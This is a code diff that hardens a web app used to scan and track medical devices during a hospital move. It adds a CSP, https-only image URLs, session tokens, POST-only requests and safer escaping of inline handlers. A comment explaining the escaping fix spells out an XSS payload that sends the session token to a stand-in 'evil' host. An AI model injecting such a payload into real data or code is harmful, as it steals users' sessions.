@@ -6,6 +6,23 @@
 <meta name="theme-color" content="#173B5B">
 <meta name="description" content="Scan medical devices during the Moorfields to Oriel move: instant move or do-not-move answer, destination, and one-tap status.">
 <meta name="robots" content="noindex,nofollow">
+<!-- Defence in depth. GitHub Pages cannot set response headers, so the policy lives here.
+     What it buys: even with a script injection, the page cannot POST your session token
+     to another host (connect-src), cannot be framed for clickjacking (frame-ancestors),
+     cannot have its relative URLs hijacked (base-uri), and cannot submit a form off-site
+     (form-action). script-src still needs 'unsafe-inline' because the app is one inline
+     script with inline handlers; that is the honest limit of this approach. -->
+<meta http-equiv="Content-Security-Policy" content="
+  default-src 'none';
+  script-src 'unsafe-inline';
+  style-src 'unsafe-inline';
+  img-src 'self' data: https:;
+  connect-src https://script.google.com https://*.googleusercontent.com;
+  form-action 'none';
+  base-uri 'none';
+  frame-ancestors 'none';
+  object-src 'none'">
+<meta name="referrer" content="no-referrer">
 <title>Oriel Move — Clinical Engineering</title>
 <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 40 40'%3E%3Crect width='40' height='40' fill='%23173B5B'/%3E%3Cg fill='%23DDE460'%3E%3Ccircle cx='20' cy='5' r='2.4'/%3E%3Ccircle cx='30.6' cy='9.4' r='2.4'/%3E%3Ccircle cx='35' cy='20' r='2.4'/%3E%3Ccircle cx='30.6' cy='30.6' r='2.4'/%3E%3Ccircle cx='20' cy='35' r='2.4'/%3E%3Ccircle cx='9.4' cy='30.6' r='2.4'/%3E%3Ccircle cx='5' cy='20' r='2.4'/%3E%3Ccircle cx='9.4' cy='9.4' r='2.4'/%3E%3C/g%3E%3Ccircle cx='20' cy='20' r='6.4' fill='%233F8CA6'/%3E%3C/svg%3E">
 <style>
@@ -398,7 +415,13 @@ let COLS = [], ASSETS = new Map(), SERIALS = new Map();
 /* One photo per MODEL, not per asset — 436 models across 2,876 assets, so a picture of
    "Pentacam HR" earns its keep on every Pentacam HR in the building. */
 let PHOTOS = {};
-const photoFor = r => PHOTOS[t(r[KEY.model]).toLowerCase()] || null;
+/* Only https images are ever rendered. A stored javascript:, data: or blob: URL would
+   otherwise be a stored-XSS vector the moment someone taps the picture. */
+const safeImg = u => /^https:\/\//i.test(t(u)) ? t(u) : '';
+const photoFor = r => {
+  const p = PHOTOS[t(r[KEY.model]).toLowerCase()];
+  return (p && safeImg(p.url)) ? { ...p, url: safeImg(p.url) } : null;
+};
 let REV = '0', recent = [], apiUrl = '', sheetId = '';
 let route = 'scan', currentAsset = null, wedge = false, findLimit = 60;
 
@@ -408,6 +431,9 @@ let route = 'scan', currentAsset = null, wedge = false, findLimit = 60;
    about the key is ever written to disk, and closing the tab is the way to hand the
    device to someone else. */
 const SESSION_KEY = 'oriel.session';
+/* What is held here is a session TOKEN issued by Apps Script, not the master key. The
+   key is typed once, sent once, and never stored. A stolen token expires in six hours
+   and can be killed server-side with revokeAllSessions(). */
 let session = null;
 function loadSession(){
   try { session = JSON.parse(sessionStorage.getItem(SESSION_KEY) || 'null'); }
@@ -419,6 +445,7 @@ function saveSession(s){
   else sessionStorage.removeItem(SESSION_KEY);
   paintLock();
 }
+const cred = () => session && (session.token || session.key);
 const canEdit   = () => !!(session && session.canEdit);
 const canStatus = () => !!(session && session.canStatus);
 
@@ -458,9 +485,12 @@ const DB = (()=>{
    body is still JSON; only the header differs. */
 const api = {
   configured: () => !!apiUrl,
-  async get(params){
+  /* Reads are POSTs. A GET would put the credential in the URL, and URLs end up in the
+     Apps Script execution transcript, in browser history and in proxy logs. */
+  async get(params){ return this.post(params); },
+  async ping(){
     const u = new URL(apiUrl);
-    Object.entries(params).forEach(([k,v]) => v != null && u.searchParams.set(k,v));
+    u.searchParams.set('action', 'ping');
     const r = await fetch(u, { method:'GET', redirect:'follow' });
     if(!r.ok) throw new Error('Server returned ' + r.status);
     return r.json();
@@ -527,6 +557,21 @@ const esc = s => t(s).replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;
    workbook's transport column really is named "...(Mover / OEM / Internal) " with a
    trailing space — and trimming it in a form field's name breaks every edit to it. */
 const escA = s => (s == null ? '' : String(s)).replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
+
+/**
+ * A value going INTO an inline event handler, e.g. onclick="go('asset', HERE )".
+ *
+ * esc() is not enough there and neither is escaping the apostrophe: the browser HTML-
+ * decodes the attribute FIRST and only then parses the result as JavaScript, so &#39;
+ * turns back into a quote and breaks out of the string. An asset whose Equipment No is
+ *     x');fetch('//evil/?'+sessionStorage.getItem('oriel.session'));//
+ * would then run in every viewer's browser — and asset numbers come from a spreadsheet
+ * anyone with the key can edit, or from an imported workbook.
+ *
+ * JSON.stringify produces a complete, quoted JS literal with backslashes and quotes
+ * already escaped; escA then makes it attribute-safe. Both layers are required.
+ */
+const jsArg = v => escA(JSON.stringify(v == null ? '' : String(v)));
 const uuid = () => (crypto.randomUUID ? crypto.randomUUID()
   : 'x' + Date.now().toString(36) + Math.random().toString(36).slice(2,10));
 let toastTimer;
@@ -547,7 +592,10 @@ function fmtWhen(iso){
 /* ═══════════════════════════════ boot ════════════════════════════════ */
 async function boot(){
   loadSession();
-  apiUrl = localStorage.getItem('oriel.api') || CONFIG.API_URL || '';
+  /* When the build pins an API_URL it wins outright. Otherwise anything that can write
+     to localStorage — an XSS, a shared machine — could redirect the next unlock and
+     collect the master key as it is typed. */
+  apiUrl = CONFIG.API_URL || localStorage.getItem('oriel.api') || '';
   sheetId = localStorage.getItem('oriel.sheetId') || '';
 
   PHOTOS = (await DB.get('meta','photos'))?.v || {};
@@ -609,7 +657,7 @@ async function refresh(opts = {}){
   if(!navigator.onLine) { if(!opts.quiet) toast('Offline — showing the cached register'); return; }
   try{
     if(!opts.quiet) toast('Checking for changes…');
-    const res = await api.get({ action:'get', since:REV, key: session?.key });
+    const res = await api.get({ action:'get', since:REV, key: cred() });
     if(!res.ok) throw new Error(res.error || 'Server refused the request');
     if(res.unchanged){ if(!opts.quiet) toast('Already up to date'); return; }
 
@@ -632,7 +680,7 @@ async function refresh(opts = {}){
 async function loadPhotos(){
   if(!api.configured() || !navigator.onLine) return;
   try{
-    const res = await api.get({ action:'photos', key: session?.key });
+    const res = await api.get({ action:'photos', key: cred() });
     if(!res.ok) return;
     PHOTOS = res.photos || {};
     await DB.put('meta', { k:'photos', v:PHOTOS });
@@ -681,10 +729,10 @@ function openPhoto(model){
       <input id="photoUrl" placeholder="https://…" spellcheck="false" autocomplete="off"></label>
     <div class="btn-row">
       <button class="btn btn-quiet" onclick="closeSheet()">Cancel</button>
-      <button class="btn btn-teal" onclick="savePhotoUrl(${escA(JSON.stringify(model))})">Use this link</button>
+      <button class="btn btn-teal" onclick="savePhotoUrl(${jsArg(model)})">Use this link</button>
     </div>
     ${has ? `<div style="height:10px"></div>
-      <button class="btn btn-danger" onclick="removePhoto(${escA(JSON.stringify(model))})">Remove this photo</button>` : ''}`);
+      <button class="btn btn-danger" onclick="removePhoto(${jsArg(model)})">Remove this photo</button>` : ''}`);
   $('#photoFile').onchange = e => uploadPhoto(model, e.target.files[0]);
 }
 
@@ -695,7 +743,7 @@ async function uploadPhoto(model, file){
     $('#photoErr').innerHTML = '<div class="viewnote"><span>Preparing the photo…</span></div>';
     const dataUrl = await shrink(file);
     $('#photoErr').innerHTML = '<div class="viewnote"><span>Uploading…</span></div>';
-    const res = await api.post({ action:'photo', key: session.key, by: session.name,
+    const res = await api.post({ action:'photo', key: cred(), by: session.name,
                                  model, dataUrl, equipmentNo: currentAsset });
     if(!res.ok) return err(res.error || 'The sheet refused the photo.');
     PHOTOS[t(model).toLowerCase()] = { model, url: res.url, by: session.name, at: new Date().toISOString() };
@@ -710,7 +758,7 @@ async function savePhotoUrl(model){
   const err = m => $('#photoErr').innerHTML = '<div class="err">' + esc(m) + '</div>';
   if(!/^https:\/\//i.test(url)) return err('A photo link must start with https://');
   try{
-    const res = await api.post({ action:'photo', key: session.key, by: session.name,
+    const res = await api.post({ action:'photo', key: cred(), by: session.name,
                                  model, url, equipmentNo: currentAsset });
     if(!res.ok) return err(res.error || 'The sheet refused the photo.');
     PHOTOS[t(model).toLowerCase()] = { model, url: res.url, by: session.name, at: new Date().toISOString() };
@@ -722,7 +770,7 @@ async function savePhotoUrl(model){
 
 async function removePhoto(model){
   try{
-    await api.post({ action:'unphoto', key: session.key, by: session.name, model });
+    await api.post({ action:'unphoto', key: cred(), by: session.name, model });
     delete PHOTOS[t(model).toLowerCase()];
     await DB.put('meta', { k:'photos', v:PHOTOS });
     closeSheet(); toast('Photo removed');
@@ -731,8 +779,10 @@ async function removePhoto(model){
 }
 
 function zoomPhoto(url, caption){
+  const src = safeImg(url);
+  if(!src) return toast('That photo link is not a valid https image');
   openSheet(`<h2>${esc(caption)}</h2>
-    <img class="photo tall" src="${escA(url)}" alt="Photo of ${esc(caption)}">
+    <img class="photo tall" src="${escA(src)}" alt="Photo of ${esc(caption)}">
     <div style="height:12px"></div>
     <button class="btn btn-quiet" onclick="closeSheet()">Close</button>`);
 }
@@ -759,16 +809,17 @@ async function drain(){
     const items = (await DB.all('queue')).sort((a,b) => a.occurredAt.localeCompare(b.occurredAt));
     if(!items.length) return;
     const res = await api.post({
-      action: 'batch', key: session.key, by: session.name,
+      action: 'batch', key: cred(), by: session.name,
       ops: items.map(i => {
         const { _localId, ...op } = i.op;          // client-only hint, never sent
         return { ...op, clientId: i.clientId, occurredAt: i.occurredAt };
       })
     });
     if(!res.ok){
-      if(res.code === 'BAD_KEY'){
+      if(res.code === 'BAD_KEY' || res.code === 'LOCKED'){
         saveSession(null);
-        toast('Your key was rejected. Unlock again to send ' + items.length + ' pending change(s).');
+        toast('Your session has ended. Unlock again to send ' +
+              items.length + ' pending change' + (items.length === 1 ? '' : 's') + '.');
       }
       return;
     }
@@ -922,11 +973,13 @@ async function doUnlock(){
   }
   $('#uGo').textContent = 'Checking…'; $('#uGo').disabled = true;
   try{
-    const res = await api.post({ action:'unlock', key });
+    const res = await api.post({ action:'unlock', key, by: name });
     if(!res.ok){ $('#uGo').textContent = 'Unlock'; $('#uGo').disabled = false;
       return err(res.error || 'That key was not accepted.'); }
     localStorage.setItem('oriel.name', name);
-    saveSession({ key, name, role: res.role, canEdit: !!res.canEdit, canStatus: !!res.canStatus });
+    // Deliberately not keeping `key`.
+    saveSession({ token: res.token, name, role: res.role,
+                  canEdit: !!res.canEdit, canStatus: !!res.canStatus, at: Date.now() });
     closeSheet(); buzz();
     toast('Editing unlocked · ' + res.role);
     drain();
@@ -985,9 +1038,9 @@ function doScan(raw){
     buzz([60,60,60]);
     openSheet(`<h2>No match for ${esc(raw)}</h2>
       <p class="sub">Nothing in the register uses that equipment or serial number.</p>
-      <button class="btn btn-primary" onclick="closeSheet();go('find');document.getElementById('q').value=${esc(JSON.stringify(t(raw)))};F.q=${esc(JSON.stringify(t(raw)))};renderFind()">Search the register</button>
+      <button class="btn btn-primary" onclick="closeSheet();go('find');document.getElementById('q').value=${jsArg(t(raw))};F.q=${jsArg(t(raw))};renderFind()">Search the register</button>
       <div style="height:8px"></div>
-      ${canEdit() ? `<button class="btn btn-ghost" onclick="closeSheet();openAdd(${esc(JSON.stringify(t(raw)))})">Add it as a new asset</button><div style="height:8px"></div>` : ''}
+      ${canEdit() ? `<button class="btn btn-ghost" onclick="closeSheet();openAdd(${jsArg(t(raw))})">Add it as a new asset</button><div style="height:8px"></div>` : ''}
       <button class="btn btn-quiet" onclick="closeSheet()">Try again</button>`);
     return;
   }
@@ -1001,7 +1054,7 @@ function renderRecent(){
   w.classList.remove('hide');
   $('#recent').innerHTML = recent.map(id => {
     const r = ASSETS.get(id); if(!r) return '';
-    return `<button onclick="go('asset','${esc(id)}')">${esc(id)} · ${esc(t(r[KEY.model]).slice(0,18))}</button>`;
+    return `<button onclick="go(${jsArg('asset')},${jsArg(id)})">${esc(id)} · ${esc(t(r[KEY.model]).slice(0,18))}</button>`;
   }).join('');
 }
 
@@ -1080,9 +1133,9 @@ function renderAsset(id){
 
   ${r._pending ? `<div class="banner"><span>Added on this device. It reaches the sheet when the queue next syncs.</span></div>` : ''}
   ${conflict ? `<div class="banner"><span>${esc(conflict)}</span>
-     <button onclick="${canEdit() ? `openEdit('${esc(id)}')` : `openUnlock('Unlock to fix this.')`}">${canEdit() ? 'Fix' : 'Unlock'}</button></div>` : ''}
+     <button onclick="${canEdit() ? `openEdit(${jsArg(id)})` : `openUnlock('Unlock to fix this.')`}">${canEdit() ? 'Fix' : 'Unlock'}</button></div>` : ''}
   ${issue ? `<div class="banner" style="background:#F6DCDD;color:var(--stop-d)"><span><b>Issue:</b> ${esc(issue)}</span>
-     ${canStatus() ? `<button onclick="setIssue('${esc(id)}','')">Clear</button>` : ''}</div>` : ''}
+     ${canStatus() ? `<button onclick="setIssue(${jsArg(id)},'')">Clear</button>` : ''}</div>` : ''}
 
   <div class="card">
     <div class="idrow"><div>
@@ -1090,11 +1143,11 @@ function renderAsset(id){
       <div class="assetno">${esc(r[KEY.brand])} · Asset ${esc(id)}</div></div></div>
     ${photo
       ? `<img class="photo" src="${escA(photo.url)}" alt="Photo of ${esc(r[KEY.model])}" loading="lazy"
-             onclick="zoomPhoto(${escA(JSON.stringify(photo.url))},${escA(JSON.stringify(t(r[KEY.model])))})"
+             onclick="zoomPhoto(${jsArg(photo.url)},${jsArg(t(r[KEY.model]))})"
              onerror="this.classList.add('broken')">
-         <p class="photocap">Photo of this model${canEdit() ? ` · <button onclick="openPhoto(${escA(JSON.stringify(t(r[KEY.model])))})">Replace</button>` : ''}</p>`
+         <p class="photocap">Photo of this model${canEdit() ? ` · <button onclick="openPhoto(${jsArg(t(r[KEY.model]))})">Replace</button>` : ''}</p>`
       : (canEdit() && t(r[KEY.model])
-          ? `<button class="btn btn-quiet" style="margin-bottom:14px" onclick="openPhoto(${escA(JSON.stringify(t(r[KEY.model])))})">
+          ? `<button class="btn btn-quiet" style="margin-bottom:14px" onclick="openPhoto(${jsArg(t(r[KEY.model]))})">
                Add a photo of this model</button>`
           : '')}
     <dl class="kv">
@@ -1118,14 +1171,14 @@ function renderAsset(id){
       ${t(r[KEY.movedBy]) ? `<span class="assetno">${esc(r[KEY.movedBy])}${t(r[KEY.movedAt]) ? ' · ' + fmtWhen(r[KEY.movedAt]) : ''}</span>` : ''}</div>
     ${canStatus() ? `
       ${idx < STAGES.length - 1
-        ? `<button class="btn btn-go" onclick="setStage('${esc(id)}','${next}')">Mark ${next.toLowerCase()}</button>`
+        ? `<button class="btn btn-go" onclick="setStage(${jsArg(id)},${jsArg(next)})">Mark ${next.toLowerCase()}</button>`
         : `<button class="btn btn-quiet" disabled>Move complete</button>`}
       <div style="height:12px"></div>
       <p class="eyebrow">Or set directly</p>
       <div class="chips">${STAGES.map(s =>
-        `<button class="chip sm ${s === stageOf(r) ? 'sel' : ''}" onclick="setStage('${esc(id)}','${s}')">${s}</button>`).join('')}</div>
+        `<button class="chip sm ${s === stageOf(r) ? 'sel' : ''}" onclick="setStage(${jsArg(id)},${jsArg(s)})">${s}</button>`).join('')}</div>
       <div style="height:12px"></div>
-      <button class="btn btn-danger" onclick="openIssue('${esc(id)}')">Report an issue</button>`
+      <button class="btn btn-danger" onclick="openIssue(${jsArg(id)})">Report an issue</button>`
     : `<div class="viewnote">
         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="5" y="11" width="14" height="9" rx="1.6"/><path d="M8 11V7.5a4 4 0 018 0V11"/></svg>
         <span>View only. Unlock with the master key to update status.</span>
@@ -1133,8 +1186,8 @@ function renderAsset(id){
   </div>` : ''}
 
   <div class="btn-row" style="margin-bottom:12px">
-    ${canEdit() ? `<button class="btn btn-ghost" onclick="openEdit('${esc(id)}')">Edit details</button>` : ''}
-    <button class="btn btn-quiet" onclick="openHistory('${esc(id)}')">History</button>
+    ${canEdit() ? `<button class="btn btn-ghost" onclick="openEdit(${jsArg(id)})">Edit details</button>` : ''}
+    <button class="btn btn-quiet" onclick="openHistory(${jsArg(id)})">History</button>
   </div>`;
   renderRecent();
 }
@@ -1180,7 +1233,7 @@ function openEdit(id){
         <input name="__reason" placeholder="e.g. confirmed with clinic lead on walkround"></label>
       <div class="btn-row">
         <button type="button" class="btn btn-quiet" onclick="closeSheet()">Cancel</button>
-        <button type="button" class="btn btn-primary" onclick="saveEdit('${esc(id)}')">Save changes</button>
+        <button type="button" class="btn btn-primary" onclick="saveEdit(${jsArg(id)})">Save changes</button>
       </div>
     </form>`);
 }
@@ -1198,13 +1251,13 @@ function openIssue(id){
     <p class="sub">This flags the asset on the dashboard so the coordinator can pick it up.</p>
     <div class="chips" style="margin-bottom:14px">
       ${['Cannot locate','Access blocked','Damaged','Too large for route','Needs OEM','Destination unclear']
-        .map(x => `<button class="chip sm" onclick="document.getElementById('issueNote').value='${x}'">${x}</button>`).join('')}
+        .map(x => `<button class="chip sm" onclick="document.getElementById('issueNote').value=${jsArg(x)}">${x}</button>`).join('')}
     </div>
     <label class="fld"><span class="lb">Detail</span>
       <input id="issueNote" placeholder="What is stopping this move?"></label>
     <div class="btn-row">
       <button class="btn btn-quiet" onclick="closeSheet()">Cancel</button>
-      <button class="btn btn-danger" onclick="closeSheet();setIssue('${esc(id)}',document.getElementById('issueNote').value)">Flag issue</button>
+      <button class="btn btn-danger" onclick="closeSheet();setIssue(${jsArg(id)},document.getElementById('issueNote').value)">Flag issue</button>
     </div>`);
 }
 
@@ -1216,7 +1269,7 @@ async function openHistory(id){
   let entries = [], err = '';
   if(api.configured() && navigator.onLine){
     try{
-      const res = await api.get({ action:'audit', id, limit:100, key: session?.key });
+      const res = await api.get({ action:'audit', id, limit:100, key: cred() });
       if(res.ok) entries = res.entries; else err = res.error || 'The sheet refused the request.';
     }catch(e){ err = 'Could not reach the sheet.'; }
   } else {
@@ -1399,7 +1452,7 @@ async function loadRecentAudit(){
     return;
   }
   try{
-    const res = await api.get({ action:'audit', limit:12, key: session?.key });
+    const res = await api.get({ action:'audit', limit:12, key: cred() });
     if(!res.ok) throw new Error(res.error);
     host.innerHTML = res.entries.map(a => `<div class="aud">
       <div class="w">${fmtWhen(a.at)} · ${esc(a.by)}</div>
@@ -1415,7 +1468,7 @@ const F = { q:'', site:'', dept:'', verdict:'', stage:'', floor:'', flag:'' };
 function setFilter(k,v){ F[k] = v; findLimit = 60; renderFind(); }
 function uniq(fn){ const s = new Set(); for(const r of ASSETS.values()){ const v = fn(r); if(v) s.add(v); } return [...s].sort(); }
 function renderFilters(){
-  const mk = (k,label,opts) => `<select onchange="setFilter('${k}',this.value)" aria-label="${label}">
+  const mk = (k,label,opts) => `<select onchange="setFilter(${jsArg(k)},this.value)" aria-label="${label}">
     <option value="">${label}</option>${opts.map(o =>
       `<option ${F[k] === o ? 'selected' : ''} value="${esc(o)}">${esc(o)}</option>`).join('')}</select>`;
   $('#filters').innerHTML =
@@ -1459,7 +1512,7 @@ function renderFind(){
   $('#findResults').innerHTML = out.map(r => {
     const v = verdictOf(r);
     const ph = photoFor(r);
-    return `<button class="res" onclick="go('asset','${esc(r._id)}')">
+    return `<button class="res" onclick="go(${jsArg('asset')},${jsArg(r._id)})">
       <span class="flagbar" style="background:${colour[v]}"></span>
       ${ph ? `<img class="thumb" src="${escA(ph.url)}" alt="" loading="lazy" onerror="this.remove()">` : ''}
       <span class="body">
@@ -1662,7 +1715,7 @@ async function stageImport(file){
     const gz = await gzipB64(JSON.stringify({ c: cols, r: rows }));
     pendingImport = { gz, filename: file.name, rows: rows.length };
 
-    const res = await api.post({ action:'import', key: session.key, by: session.name,
+    const res = await api.post({ action:'import', key: cred(), by: session.name,
                                  gz, filename: file.name, dryRun: true });
     if(!res.ok) throw new Error(res.error || 'The sheet refused the import.');
     showImportPreview(res);
@@ -1712,7 +1765,7 @@ async function runImport(letFileWin){
   if(!pendingImport) return;
   openSheet(`<h2>Importing…</h2><p class="sub">Writing to the Google Sheet. This can take a minute on a large change — do not close the page.</p><div class="spin"></div>`);
   try{
-    const res = await api.post({ action:'import', key: session.key, by: session.name,
+    const res = await api.post({ action:'import', key: cred(), by: session.name,
                                  gz: pendingImport.gz, filename: pendingImport.filename,
                                  letFileWin: !!letFileWin });
     if(!res.ok) throw new Error(res.error || 'The import failed.');
@@ -1804,6 +1857,11 @@ async function renderData(){
 
 function promptSetup(){
   localStorage.setItem('oriel.seenSetup','1');
+  if(CONFIG.API_URL) return openSheet(`<h2>Already connected</h2>
+    <p class="sub">This site is pinned to one Apps Script deployment in its source, which
+      cannot be changed from the browser. To point it elsewhere, edit <code class="k">CONFIG.API_URL</code>
+      in <code class="k">index.html</code> and redeploy.</p>
+    <button class="btn btn-quiet" onclick="closeSheet()">Close</button>`);
   openSheet(`
     <h2>Connect the Google Sheet</h2>
     <p class="sub">Paste the Apps Script web app URL. It ends in <code class="k">/exec</code>. Setup instructions are in the README.</p>
@@ -1823,7 +1881,7 @@ function promptSetup(){
     $('#apiGo').textContent = 'Testing…'; $('#apiGo').disabled = true;
     const prev = apiUrl; apiUrl = url;
     try{
-      const res = await api.get({ action:'ping' });
+      const res = await api.ping();
       if(!res.ok) throw new Error(res.error || 'The script returned an error.');
       localStorage.setItem('oriel.api', url);
       if(res.sheetId){ sheetId = res.sheetId; localStorage.setItem('oriel.sheetId', sheetId); }
